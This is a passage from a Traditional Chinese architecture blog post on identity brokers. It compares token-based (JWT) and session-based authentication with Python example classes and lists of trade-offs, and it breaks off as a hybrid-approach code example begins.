<!DOCTYPE html><html lang="zh-TW"><head><!-- hexo injector head_begin start --><!-- Google tag (gtag.js) begins-->
    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3DZR3TQYCY"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-3DZR3TQYCY');
    </script>
    <!-- Google tag (gtag.js) ends-->
    <!-- hexo injector head_begin end -->
    <meta charset="utf-8">
    <!-- security headers starts -->
    <!-- meta http-equiv="content-security-policy" content="script-src 'sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=' 'sha256-lJjk3/dvd+wXqRFjV7T5L/nXJXr5NjUjmsKSPEe+ass=';" -->
    <!-- security headers ends -->
    <!-- favicon starts -->    
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <!-- favicon ends -->
    

    
    <title>身份代理：分散式系統中的集中式身份驗證 | Decoding Digital Anomalies</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta name="keywords" content="Architecture,Authentication,Security">
    
    
    <meta name="description" content="身份代理在多個系統中集中管理身份驗證，但實作選擇會影響安全性、效能和使用者體驗。了解模式、權衡和陷阱。">
<meta property="og:type" content="article">
<meta property="og:title" content="身份代理：分散式系統中的集中式身份驗證">
<meta property="og:url" content="https://neo01.com/zh-TW/2021/12/Identity-Broker-Patterns/index.html">
<meta property="og:site_name" content="Decoding Digital Anomalies">
<meta property="og:description" content="身份代理在多個系統中集中管理身份驗證，但實作選擇會影響安全性、效能和使用者體驗。了解模式、權衡和陷阱。">
<meta property="og:locale" content="zh_TW">
<meta property="article:published_time" content="2021-12-23T16:00:00.000Z">
<meta property="article:modified_time" content="2025-10-23T14:57:12.764Z">
<meta property="article:author" content="Neo Alienson">
<meta property="article:tag" content="Architecture">
<meta property="article:tag" content="Authentication">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
    
            <link rel="alternate" href="/atom.xml" title="Decoding Digital Anomalies" type="application/atom+xml">
    

    

    

    

    

    

    

    
    
        


    
    
        


    

<!-- hexo injector head_end start --><link rel="stylesheet" type="text/css" href="/css/bundle.css"><script type="text/javascript" src="/js/bundle_first.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0">  <link rel="canonical" href="https://neo01.com/zh-TW/2021/12/Identity-Broker-Patterns">
<style id="admonition-styles">.admonition {
  margin: 1em 0;
  padding: 0rem;
  border-left: 0.3rem solid;
  border-radius: 0.4rem;
  background-color: #f9f9f9;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.04);
  overflow: hidden;
  page-break-inside: avoid;
}

.admonition-title {
  display: flex;
  align-items: center;
  font-weight: 600;
  padding: 0rem 1rem 0.1rem 0.75rem;
  font-size: 1.05em;
  background-color: rgba(0, 0, 0, 0.03);
  border-top-left-radius: 0.4rem;
  border-top-right-radius: 0.4rem;
  margin: 0 !important;
}

.admonition-icon {
  font-size: 1.2em;
  margin-right: 0.6rem;
  opacity: 0.85;
  margin-top: 0.1rem;
}

/* 内容区域 margin */
.admonition > *:not(.admonition-title) {
  margin: 0.6rem 1rem 0.6rem 1rem;
}

/* NOTE 类型 */
.admonition.anote {
  border-color: #448aff;
}
.admonition.anote > .admonition-title {
  background-color: #448aff1a;
  color: #2962ff;
}

/* INFO / TODO 类型 */
.admonition.info,
.admonition.todo {
  border-color: #00b8d4;
}
.admonition.info > .admonition-title,
.admonition.todo > .admonition-title {
  background-color: rgba(0, 184, 212, 0.1);
  color: #007c91;
}

/* 警告类 */
.admonition.warning,
.admonition.attention,
.admonition.caution {
  border-color: #ff9100;
}
.admonition.warning > .admonition-title,
.admonition.attention > .admonition-title,
.admonition.caution > .admonition-title {
  background-color: rgba(255, 145, 0, 0.1);
  color: #c66900;
}

/* 错误类 */
.admonition.failure,
.admonition.missing,
.admonition.fail,
.admonition.error,
.admonition.danger,
.admonition.bug {
  border-color: #ff5252;
}
.admonition.failure > .admonition-title,
.admonition.missing > .admonition-title,
.admonition.fail > .admonition-title,
.admonition.error > .admonition-title,
.admonition.danger > .admonition-title,
.admonition.bug > .admonition-title {
  background-color: rgba(255, 82, 82, 0.1);
  color: #b71c1c;
}

/* TIP 类型 */
.admonition.tip {
  border-color: #00bfa5;
}
.admonition.tip > .admonition-title {
  background-color: #00bfa51a;
  color: #00796b;
}

/* SUCCESS 类型 */
.admonition.success {
  border-color: #00c853;
}
.admonition.success > .admonition-title {
  background-color: #00c8531a;
  color: #2e7d32;
}

/* QUESTION 类型 */
.admonition.question {
  border-color: #64dd17;
}
.admonition.question > .admonition-title {
  background-color: #64dd171a;
  color: #558b2f;
}

/* EXAMPLE 类型 */
.admonition.example {
  border-color: #7c4dff;
}
.admonition.example > .admonition-title {
  background-color: #7c4dff1a;
  color: #512da8;
}

/* QUOTE 类型 */
.admonition.quote {
  border-color: #9e9e9e;
}
.admonition.quote > .admonition-title {
  background-color: #9e9e9e1a;
  color: #424242;
}

/*黑暗模式*/
/* 夜间模式基础样式 */
[data-theme="dark"] .admonition {
  background-color: #1e1e1e;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
}

[data-theme="dark"] .admonition-title {
  background-color: rgba(255, 255, 255, 0.05);
}

/* anote */
[data-theme="dark"] .admonition.anote {
  border-color: #82b1ff;
}
[data-theme="dark"] .admonition.anote > .admonition-title {
  background-color: #82b1ff1a;
  color: #bbdefb;
}

/* tip */
[data-theme="dark"] .admonition.tip {
  border-color: #64ffda;
}
[data-theme="dark"] .admonition.tip > .admonition-title {
  background-color: #64ffda1a;
  color: #1de9b6;
}

/* success */
[data-theme="dark"] .admonition.success {
  border-color: #69f0ae;
}
[data-theme="dark"] .admonition.success > .admonition-title {
  background-color: #69f0ae1a;
  color: #00e676;
}

/* question */
[data-theme="dark"] .admonition.question {
  border-color: #b2ff59;
}
[data-theme="dark"] .admonition.question > .admonition-title {
  background-color: #b2ff591a;
  color: #aeea00;
}

/* example */
[data-theme="dark"] .admonition.example {
  border-color: #b388ff;
}
[data-theme="dark"] .admonition.example > .admonition-title {
  background-color: #b388ff1a;
  color: #b39ddb;
}

/* quote */
[data-theme="dark"] .admonition.quote {
  border-color: #bdbdbd;
}
[data-theme="dark"] .admonition.quote > .admonition-title {
  background-color: #bdbdbd1a;
  color: #eeeeee;
}

/* warning / attention / caution */
[data-theme="dark"] .admonition.warning,
[data-theme="dark"] .admonition.attention,
[data-theme="dark"] .admonition.caution {
  border-color: #ffb300;
}
[data-theme="dark"] .admonition.warning > .admonition-title,
[data-theme="dark"] .admonition.attention > .admonition-title,
[data-theme="dark"] .admonition.caution > .admonition-title {
  background-color: #ffb3001a;
  color: #ffe082;
}

/* error / fail / failure / bug / danger / missing */
[data-theme="dark"] .admonition.error,
[data-theme="dark"] .admonition.fail,
[data-theme="dark"] .admonition.failure,
[data-theme="dark"] .admonition.bug,
[data-theme="dark"] .admonition.missing,
[data-theme="dark"] .admonition.danger {
  border-color: #ef5350;
}
[data-theme="dark"] .admonition.error > .admonition-title,
[data-theme="dark"] .admonition.fail > .admonition-title,
[data-theme="dark"] .admonition.failure > .admonition-title,
[data-theme="dark"] .admonition.bug > .admonition-title,
[data-theme="dark"] .admonition.missing > .admonition-title,
[data-theme="dark"] .admonition.danger > .admonition-title {
  background-color: #ef53501a;
  color: #ff8a80;
}</style></head>

<body>
    <div id="wrap">
        <header id="header">
    <div id="header-outer" class="outer">
        <div class="container">
            <div class="container-inner">
                <div id="header-title">
                    <h1 class="logo-wrap">
                        <a href="/" title="Homepage" class="logo"></a>
                    </h1>
                        <h2 class="subtitle-wrap">
                            <p class="title">解碼數位異象</p>
                          <p class="subtitle">有時功能就是數位兔子洞中的錯誤，反之亦然</p>
                        </h2>
                    <div id="lang-selector">
                        <span class="lang-icon">🌐</span>
                        
                                <a href="/2021/12/Identity-Broker-Patterns/" class="lang-link">English</a>
<span class="lang-sep">|</span>                                <a href="/zh-CN/2021/12/Identity-Broker-Patterns/" class="lang-link">简体中文</a>
<span class="lang-sep">|</span>                                <a href="/ja/2021/12/Identity-Broker-Patterns/" class="lang-link">日本語</a>
                    </div>
                </div>
                <div id="header-inner" class="nav-container">
                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
                    <div class="nav-container-inner">
                        <ul id="main-nav">
                            
                                <li class="main-nav-list-item">
                                    <a class="main-nav-list-link" href="/zh-TW/">首頁</a>
                                </li>
                                                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-TW/categories/AI/">人工智慧</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-TW/categories/AI/Art-Gallery/">藝術畫廊</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-TW/categories/Architecture/">架構</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-TW/categories/Cybersecurity/">資訊安全</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-TW/categories/Development/">開發</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-TW/categories/Misc/">雜項</a></li></ul>
                                <li class="main-nav-list-item">
                                    <a class="main-nav-list-link" href="/zh-TW/about-me">關於</a>
                                </li>
                            
                        </ul>
                        <nav id="sub-nav">
                            <div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" id="search-form-input" placeholder="搜尋">
        <button type="submit" title="搜尋" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" id="ins-search-input" placeholder="輸入關鍵字...">
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script integrity="sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=">
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '頁面',
            CATEGORIES: '分類',
            TAGS: '標籤',
            UNTITLED: '(未命名)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
        LANG: 'zh-TW',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>




</div>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </div>
</header>
        <div class="container">
            <div class="main-body container-inner">
                <div class="main-body-inner">
                    <section id="main">
                        <div class="main-body-header">
    <h1 class="header">
    
    <a class="page-title-link" href="/categories/Development/">Development</a>
    </h1>
</div>

                        <div class="main-body-content">
                            <article id="post-2021/12/Identity-Broker-Patterns-zh-TW" class="article article-single article-type-post" itemscope="" itemprop="blogPost">
    <div class="article-inner responsive-content">
        
            <header class="article-header">
                
    
        <h1 class="article-title" itemprop="name">
        身份代理：分散式系統中的集中式身份驗證
        </h1>
    

            </header>
        
        
            <div class="article-meta">
                
    <div class="article-date">
      <i class="fa fa-calendar"></i>
        
          Created <time datetime="2021-12-23T16:00:00.000Z" itemprop="datePublished">2021-12-24</time>
          &nbsp;<i class="fa fa-calendar"></i>
          Updated <time datetime="2025-10-23T14:57:12.764Z" itemprop="datePublished">2025-10-23</time>
        
    </div>


                

                
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="/zh-TW/tags/Security/">Security</a> <a class="tag-link" href="/zh-TW/tags/Architecture/">Architecture</a> <a class="tag-link" href="/zh-TW/tags/Authentication/">Authentication</a>
    </div>

            </div>
        
        
        <div class="article-entry" itemprop="articleBody">
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E8%BA%AB%E4%BB%BD%E4%BB%A3%E7%90%86"><span class="toc-text">理解身份代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%96%BC%E6%AC%8A%E6%9D%96%E8%88%87%E5%9F%BA%E6%96%BC%E5%B7%A5%E4%BD%9C%E9%9A%8E%E6%AE%B5%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%A9%97%E8%AD%89"><span class="toc-text">基於權杖與基於工作階段的身份驗證</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%94%E5%AE%9A%E9%81%B8%E6%93%87%EF%BC%9AOAuth-2-0%E3%80%81SAML-%E5%92%8C-OpenID-Connect"><span class="toc-text">協定選擇：OAuth 2.0、SAML 和 OpenID Connect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A6%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%AE%89%E5%85%A8%E5%95%8F%E9%A1%8C"><span class="toc-text">常見陷阱和安全問題</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B5%90%E8%AB%96"><span class="toc-text">結論</span></a></li></ol>
            <p>身份代理作為分散式系統中身份驗證蔓延問題的解決方案應運而生。身份代理集中管理這些問題，提供單一登入（SSO）和統一的身份管理，而不是讓每個應用程式管理自己的使用者憑證和身份驗證邏輯。然而，這種集中化引入了新的架構挑戰：工作階段管理複雜性、單點故障以及安全性與使用者體驗之間的微妙平衡。</p>
<p>本文探討了企業系統、雲端應用程式和微服務架構中的身份代理模式。我們將剖析常見的實作方法，評估 OAuth 2.0、SAML 和 OpenID Connect 之間的協定選擇，並理解基於權杖和基於工作階段的身份驗證之間的權衡。透過真實世界的實作和安全事件，我們揭示了為什麼身份代理既必不可少又複雜。</p>
<h2 id="理解身份代理">理解身份代理</h2>
<p>在深入實作模式之前，理解身份代理的作用以及它們存在的原因至關重要。身份代理位於應用程式和身份提供者之間，轉換身份驗證協定並管理使用者工作階段。</p>
<h3 id="核心問題：身份驗證蔓延">核心問題：身份驗證蔓延</h3>
<p>沒有身份代理時，每個應用程式獨立管理身份驗證：</p>
<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 沒有身份代理的問題</p><div class="admonition-content"><p><strong>憑證重複</strong></p>
<ul>
<li>使用者為每個應用程式維護單獨的憑證</li>
<li>跨系統重複使用密碼會產生安全風險</li>
<li>密碼重設需要聯絡每個應用程式</li>
<li>沒有統一的密碼政策執行</li>
</ul>
<p><strong>整合複雜性</strong></p>
<ul>
<li>每個應用程式實作自己的身份驗證</li>
<li>與身份提供者的多個整合</li>
<li>不一致的安全實作</li>
<li>難以新增新的身份提供者</li>
</ul>
<p><strong>使用者體驗問題</strong></p>
<ul>
<li>使用者分別登入每個應用程式</li>
<li>跨系統沒有單一登入</li>
<li>工作階段管理不一致</li>
<li>登出不會在應用程式之間傳播</li>
</ul>
</div></div>
<p>身份代理透過集中身份驗證邏輯並為應用程式提供統一介面來解決這些問題。</p>
<h3 id="身份代理提供什麼">身份代理提供什麼</h3>
<p>身份代理充當應用程式和身份提供者之間的中介：</p>
<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🔑 身份代理功能</p><div class="admonition-content"><p><strong>協定轉換</strong></p>
<ul>
<li>應用程式使用一種協定（例如 OAuth 2.0）</li>
<li>身份提供者使用不同的協定（SAML、LDAP、OAuth）</li>
<li>代理在協定之間進行轉換</li>
<li>應用程式不需要特定於提供者的程式碼</li>
</ul>
<p><strong>單一登入（SSO）</strong></p>
<ul>
<li>使用者使用代理進行一次身份驗證</li>
<li>代理向應用程式頒發權杖/工作階段</li>
<li>應用程式信任代理的身份驗證</li>
<li>跨多個應用程式的無縫存取</li>
</ul>
<p><strong>身份聯合</strong></p>
<ul>
<li>連接多個身份提供者</li>
<li>使用者可以使用企業 AD、Google、GitHub 等進行身份驗證</li>
<li>代理規範化使用者屬性</li>
<li>跨提供者的統一身份</li>
</ul>
<p><strong>工作階段管理</strong></p>
<ul>
<li>集中式工作階段追蹤</li>
<li>跨所有應用程式的單點登出</li>
<li>工作階段逾時政策</li>
<li>並行工作階段控制</li>
</ul>
</div></div>
<p>流行的身份代理包括 Keycloak、Auth0、Okta、Azure AD 和 AWS Cognito。</p>
<h2 id="基於權杖與基於工作階段的身份驗證">基於權杖與基於工作階段的身份驗證</h2>
<p>身份代理可以使用權杖或工作階段實作身份驗證，每種方式都有不同的權衡。</p>
<h3 id="基於權杖的身份驗證：無狀態且可擴展">基於權杖的身份驗證：無狀態且可擴展</h3>
<p>基於權杖的身份驗證使用加密簽章的權杖（通常是 JWT）來表示已驗證的使用者：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 基於權杖的身份驗證流程</span>
<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt
<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedelta

<span class="token keyword">class</span> <span class="token class-name">TokenAuthBroker</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key
    
    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 使用身份提供者驗證憑證</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 頒發 JWT 權杖</span>
            payload <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
                <span class="token string">'iat'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'roles'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>get_user_roles<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> token
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token keyword">def</span> <span class="token function">validate_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> payload
        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>JWTError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token comment"># 應用程式在不聯絡代理的情況下驗證權杖</span>
<span class="token keyword">def</span> <span class="token function">protected_endpoint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> broker<span class="token punctuation">.</span>validate_token<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"歡迎 </span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
    <span class="token keyword">return</span> <span class="token string">"未授權"</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ 基於權杖的優勢</p><div class="admonition-content"><p><strong>無狀態架構</strong></p>
<ul>
<li>不需要伺服器端工作階段儲存</li>
<li>應用程式獨立驗證權杖</li>
<li>無需工作階段複製即可水平擴展</li>
<li>負載平衡器中不需要工作階段親和性</li>
</ul>
<p><strong>效能</strong></p>
<ul>
<li>每個請求無需資料庫查找</li>
<li>驗證是加密簽章檢查</li>
<li>減少身份驗證檢查的延遲</li>
<li>降低身份代理的負載</li>
</ul>
<p><strong>微服務友善</strong></p>
<ul>
<li>權杖在服務之間傳遞</li>
<li>不需要共享工作階段儲存</li>
<li>服務獨立驗證權杖</li>
<li>解耦架構</li>
</ul>
</div></div>
<p>然而，基於權杖的身份驗證有顯著的缺點：</p>
<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 基於權杖的挑戰</p><div class="admonition-content"><p><strong>撤銷困難</strong></p>
<ul>
<li>權杖在過期前有效</li>
<li>無法立即撤銷被洩露的權杖</li>
<li>登出不會使現有權杖失效</li>
<li>需要權杖黑名單（破壞無狀態優勢）</li>
</ul>
<p><strong>權杖大小</strong></p>
<ul>
<li>JWT 包含使用者資料和聲明</li>
<li>每個請求都發送</li>
<li>比工作階段 ID 大</li>
<li>行動客戶端的頻寬開銷</li>
</ul>
<p><strong>安全風險</strong></p>
<ul>
<li>權杖儲存在瀏覽器中（XSS 漏洞）</li>
<li>長期權杖增加暴露視窗</li>
<li>權杖被竊允許在過期前冒充</li>
<li>重新整理權杖管理複雜性</li>
</ul>
</div></div>
<h3 id="基於工作階段的身份驗證：有狀態但可控">基於工作階段的身份驗證：有狀態但可控</h3>
<p>基於工作階段的身份驗證使用伺服器端工作階段，將工作階段 ID 發送給客戶端：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 基於工作階段的身份驗證流程</span>
<span class="token keyword">import</span> secrets
<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedelta

<span class="token keyword">class</span> <span class="token class-name">SessionAuthBroker</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>sessions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 生產環境：Redis、資料庫</span>
    
    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 使用身份提供者驗證憑證</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 建立工作階段</span>
            session_id <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>sessions<span class="token punctuation">[</span>session_id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
                <span class="token string">'created'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'expires'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'roles'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>get_user_roles<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> session_id
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        session <span class="token operator">=</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session_id<span class="token punctuation">)</span>
        <span class="token keyword">if</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'expires'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> session
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token keyword">def</span> <span class="token function">revoke_session</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 立即撤銷</span>
        <span class="token keyword">if</span> session_id <span class="token keyword">in</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">:</span>
            <span class="token keyword">del</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">[</span>session_id<span class="token punctuation">]</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token comment"># 應用程式使用代理檢查工作階段</span>
<span class="token keyword">def</span> <span class="token function">protected_endpoint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session_id <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'session_id'</span><span class="token punctuation">)</span>
    session <span class="token operator">=</span> broker<span class="token punctuation">.</span>validate_session<span class="token punctuation">(</span>session_id<span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> session<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"歡迎 </span><span class="token interpolation"><span class="token punctuation">{</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
    <span class="token keyword">return</span> <span class="token string">"未授權"</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ 基於工作階段的優勢</p><div class="admonition-content"><p><strong>立即撤銷</strong></p>
<ul>
<li>工作階段儲存在伺服器端</li>
<li>登出立即使工作階段失效</li>
<li>被洩露的工作階段可以立即撤銷</li>
<li>細粒度的工作階段控制</li>
</ul>
<p><strong>更小的客戶端儲存</strong></p>
<ul>
<li>只有工作階段 ID 發送給客戶端</li>
<li>最小的頻寬開銷</li>
<li>使用者資料儲存在伺服器端</li>
<li>減少 XSS 暴露</li>
</ul>
<p><strong>靈活的工作階段管理</strong></p>
<ul>
<li>無需客戶端變更即可更新工作階段資料</li>
<li>追蹤工作階段活動和位置</li>
<li>實作並行工作階段限制</li>
<li>豐富的工作階段中繼資料</li>
</ul>
</div></div>
<p>基於工作階段的身份驗證也有權衡：</p>
<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 基於工作階段的挑戰</p><div class="admonition-content"><p><strong>可擴展性複雜性</strong></p>
<ul>
<li>需要共享工作階段儲存（Redis、資料庫）</li>
<li>跨伺服器的工作階段複製</li>
<li>負載平衡器工作階段親和性或黏性工作階段</li>
<li>水平擴展更複雜</li>
</ul>
<p><strong>效能開銷</strong></p>
<ul>
<li>每個請求都需要資料庫查找</li>
<li>到工作階段儲存的網路延遲</li>
<li>身份代理的負載更高</li>
<li>大規模時的潛在瓶頸</li>
</ul>
<p><strong>分散式系統挑戰</strong></p>
<ul>
<li>微服務必須呼叫代理進行驗證</li>
<li>每個請求的網路依賴</li>
<li>服務鏈中的延遲增加</li>
<li>代理成為關鍵依賴</li>
</ul>
</div></div>
<h3 id="混合方法：短期權杖與重新整理權杖">混合方法：短期權杖與重新整理權杖</h3>
<p>許多現代系統使用混合方法，結合兩者的優勢：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 使用存取權杖和重新整理權杖的混合身份驗證</span>
<span class="token keyword">class</span> <span class="token class-name">HybridAuthBroker</span><span class="token punctuation">:</span>
